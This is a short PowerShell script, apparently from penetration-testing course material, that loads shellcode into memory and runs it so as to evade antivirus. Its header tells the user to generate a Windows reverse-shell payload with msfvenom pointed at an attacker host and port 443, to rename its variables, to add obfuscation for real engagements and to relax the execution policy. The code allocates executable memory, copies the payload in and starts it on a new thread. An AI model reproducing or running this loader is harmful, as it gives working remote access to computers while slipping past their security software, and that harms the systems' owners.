<#
Bypass AV with remote process memory injection.
Change the two variable names and Win32.
Generate shell code using at least the following command:
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f powershell -v sc
Use more obfuscation in real engagement.
Run in x86 version of PowerShell.
  %SystemRoot%\SysWow64\WindowsPowerShell\v1.0\powershell.ex
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Credit Offsec 2023 - For Educational Puposes Only
#>

$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$VARIABLE1 = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $VARIABLE2 = ShellCodeHere;

$size = 0x1000;

if ($VARIABLE2.Length -gt 0x1000) {$size = $VARIABLE2.Length};

$x = $VARIABLE1::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($VARIABLE2.Length-1);$i++) {$VARIABLE1::memset([IntPtr]($x.ToInt32()+$i), $VARIABLE2[$i], 1)};

$VARIABLE1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
